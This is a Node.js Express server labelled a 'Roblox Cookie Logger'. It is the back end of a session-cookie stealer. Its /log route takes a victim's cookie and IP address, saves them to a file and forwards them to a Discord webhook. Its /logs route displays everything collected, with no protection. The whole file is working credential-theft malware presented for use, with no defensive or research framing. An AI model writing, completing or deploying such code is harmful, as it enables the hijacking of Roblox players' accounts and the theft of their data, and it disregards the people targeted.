// ============================================================
// Roblox Cookie Logger - Server Side (Node.js)
// ============================================================
// Requirements: npm install express axios
// ============================================================

const express = require("express");
const axios = require("axios");
const fs = require("fs");

const app = express();
const PORT = process.env.PORT || 3000;

// ─── CONFIG ───
const LOG_FILE = "cookies.txt";
const WEBHOOK_URL = process.env.WEBHOOK_URL || ""; // Discord webhook

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ─── ROUTE: Receive cookie ───
app.post("/log", (req, res) => {
  const cookie = req.body.cookie || req.query.cookie;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  
  if (!cookie) {
    return res.status(400).send("No cookie provided");
  }

  // Log to file
  const logEntry = `[${new Date().toISOString()}] IP: ${ip} | Cookie: ${cookie}\n`;
  fs.appendFileSync(LOG_FILE, logEntry);

  // Send to Discord webhook if configured
  if (WEBHOOK_URL) {
    axios.post(WEBHOOK_URL, {
      content: `**New Cookie Logged**\nIP: ${ip}\nCookie: \`${cookie}\``
    }).catch(() => {});
  }

  res.send("Logged");
});

// ─── ROUTE: View logs ───
app.get("/logs", (req, res) => {
  if (!fs.existsSync(LOG_FILE)) {
    return res.send("No logs yet");
  }
  const logs = fs.readFileSync(LOG_FILE, "utf8");
  res.send(`<pre>${logs}</pre>`);
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
